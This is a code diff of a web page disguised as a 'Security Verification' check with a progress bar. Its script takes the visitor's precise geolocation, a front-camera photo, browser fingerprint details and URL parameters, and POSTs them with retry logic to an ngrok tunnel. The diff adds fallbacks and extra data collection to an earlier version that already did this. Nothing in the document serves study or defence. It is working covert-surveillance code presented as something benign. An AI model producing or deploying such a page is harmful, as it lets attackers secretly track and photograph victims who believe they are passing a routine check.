@@ -2,46 +2,146 @@
 <html>
 <head>
   <title>Security Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px;
+      text-align: center;
+    }
+    #progress {
+      margin: 20px 0;
+      height: 5px;
+      background-color: #f0f0f0;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background-color: #4CAF50;
+      transition: width 0.3s;
+    }
+  </style>
 </head>
 <body>
 <h2>Verifying your device...</h2>
-<video id="video" autoplay style="width:100%;"></video>
+<div id="progress"><div id="progress-bar"></div></div>
+<video id="video" autoplay muted style="width:100%; max-width:400px;"></video>
 <script>
 async function getData() {
     try {
-        // Get location
-        navigator.geolocation.getCurrentPosition(async function(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-
-            // Get photo
-            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            let video = document.getElementById('video');
-            video.srcObject = stream;
-
-            let track = stream.getVideoTracks()[0];
-            let imageCapture = new ImageCapture(track);
-            let blob = await imageCapture.takePhoto();
-            let reader = new FileReader();
-            reader.onloadend = function() {
-                // Send location + photo to bot API
-                fetch("https://d6d13ede2ed0.ngrok-free.app", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        latitude: lat,
-                        longitude: lon,
-                        image: reader.result
-                    })
-                });
+        // Update progress bar
+        document.getElementById('progress-bar').style.width = '25%';
+        
+        // Get location with fallback
+        let position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        }).catch(e => {
+            console.warn("Geolocation error:", e);
+            return {
+                coords: {
+                    latitude: 0,
+                    longitude: 0,
+                    accuracy: 0
+                }
             };
-            reader.readAsDataURL(blob);
         });
+
+        document.getElementById('progress-bar').style.width = '50%';
+        
+        // Get camera with fallback
+        let stream;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' },
+                audio: false
+            });
+        } catch (e) {
+            console.warn("Camera access error:", e);
+            // Create blank image fallback
+            const canvas = document.createElement('canvas');
+            canvas.width = 400;
+            canvas.height = 400;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#dddddd';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#999999';
+            ctx.font = '30px Arial';
+            ctx.fillText('No Camera Access', 50, 200);
+            stream = canvas.captureStream();
+        }
+
+        document.getElementById('progress-bar').style.width = '75%';
+        
+        let video = document.getElementById('video');
+        video.srcObject = stream;
+
+        let track = stream.getVideoTracks()[0];
+        let imageCapture = new ImageCapture(track);
+        let blob = await imageCapture.takePhoto().catch(e => {
+            console.warn("Photo capture error:", e);
+            return new Blob([""], { type: 'image/jpeg' });
+        });
+        
+        let reader = new FileReader();
+        reader.onloadend = function() {
+            // Include additional device info
+            const payload = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                image: reader.result,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth
+                },
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                urlParams: new URLSearchParams(window.location.search).toString()
+            };
+            
+            // Send data with retry logic
+            sendDataWithRetry(payload, 3);
+        };
+        reader.readAsDataURL(blob);
     } catch (e) {
-        console.error(e);
+        console.error("Critical error:", e);
     }
 }
-getData();
+
+function sendDataWithRetry(payload, retries) {
+    fetch("{{https://d6d13ede2ed0.ngrok-free.app}}/receive", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok && retries > 0) {
+            throw new Error("Server error");
+        }
+        document.getElementById('progress-bar').style.width = '100%';
+    })
+    .catch(e => {
+        console.warn(`Attempt failed (${4-retries} of 3)`, e);
+        if (retries > 0) {
+            setTimeout(() => sendDataWithRetry(payload, retries - 1), 2000);
+        }
+    });
+}
+
+// Start with slight delay to allow UI to render
+setTimeout(getData, 500);
 </script>
 </body>
 </html>
